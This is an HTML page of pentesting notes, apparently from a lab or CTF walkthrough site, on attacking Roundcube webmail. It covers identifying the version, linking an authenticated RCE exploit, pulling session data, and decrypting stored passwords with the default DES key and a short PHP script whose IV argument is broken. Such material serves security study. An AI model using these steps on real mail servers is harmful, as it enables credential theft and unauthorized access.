@@ -1,0 +1,82 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Maven+Pro:wght@400..900&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="/H4ckV4ult/styles/navBarStyles.css">
+    <link rel="stylesheet" href="/H4ckV4ult/styles/walkthroughs.css">
+        <link href="/H4ckV4ult/styles/prism/prism.css" rel="stylesheet" />
+    <script src="/H4ckV4ult/styles/prism/prism.js"></script>
+    <title>Minimalist Webpage</title>
+
+</head>
+<body>
+    <div id="navbar-container"></div>
+    <script src="/H4ckV4ult/components/navbar.js"></script>
+
+    <div class="notion-container">
+        <div class="notion-header">
+            <h1>Roundcube (TCP/5000)</h1>
+            <p>Roundcube is a free and open-source, browser-based IMAP email client with an application-like user interface</p>
+        </div>
+        <div class="notion-body">
+            <h2>Enumeration</h2>
+            <ul>
+                <h3>Identify Round cube version</h3>
+                <p>In case you cant find any login credentials you could identify Roundcube version using inspect element from chrome and looking for the following parameter</p>
+                <pre><code class="language-javascript">"rcversion":10610</code></pre>
+            </ul>
+            <h2>Exploitation</h2>
+            <ul>
+                <h3>Authenticated RCE 1.5.0 - 1.6.10</h3>
+                <ul>
+                    <p>Roundcube is afected by a deserialization vulnerability which leads to an RCE. Exploit can be found <a class="notion-link" href="https://github.com/hakaioffsec/CVE-2025-49113-exploit"> Here</a></p>
+                </ul>
+                <h3>Acquiring DB data (Session)</h3>
+                <ul>
+                    <p>Roundcube is a web-based email client. It does not host or manage email accounts itself — instead, it connects to an IMAP server (like Dovecot or Courier) to access users' emails.</p>
+                    <p>Eventhough we could find temporary cyphered password in the table sessions. Selecting the content and converting it to readable text (From Base64) we can find the parameter password</p>
+                </ul>    
+                <h3>Decrypt password</h3>
+                <ul>
+                    <p>To decrypt password we must identify the key which was used to cypher. It can be found in the following file <b>roundcube/config/config.inc.php</b></p>
+                    <p>The following fill tells you</p>
+                    <pre><code class="language-php">$config['des_key'] = 'rcmail-!24ByteDESkey*Str';</code></pre>
+                    <p>Then we can use the following script in php to decrypt it</p>
+                    <pre><code class="language-php">&lt;?php
+
+function decrypt_password($encrypted, $key) {
+    $encrypted = base64_decode($encrypted);
+    $cipher = 'DES-EDE3-CBC';
+
+    // Since roundcube adds a initialitation vector (IV) at the begining of the cypered text. Here we split the string 
+    $iv = substr($encrypted, 0, 8);
+    $ciphertext = substr($encrypted, 8);
+
+    // Check if key has 24 characters
+    if (strlen($key) !== 24) {
+        die("La clave debe tener 24 caracteres exactos.\n");
+    }
+    
+    $decrypted = openssl_decrypt($ciphertext, $cipher, $key, OPENSSL_RAW_DATA, $ );
+    return $decrypted;
+}
+
+$key = 'rcmail-!24ByteDESkey*Str';
+$encrypted_pass = 'L7Rv00A8TuwJAr67kITxxcSgnIk25Am/';
+
+$decrypted = decrypt_password($encrypted_pass, $key);
+
+echo "Contraseña descifrada: " . $decrypted . "\n";
+</code></pre>
+                        
+
+                </ul>
+            </ul>
+        </div>
+    </div>
+</body>
+</html>
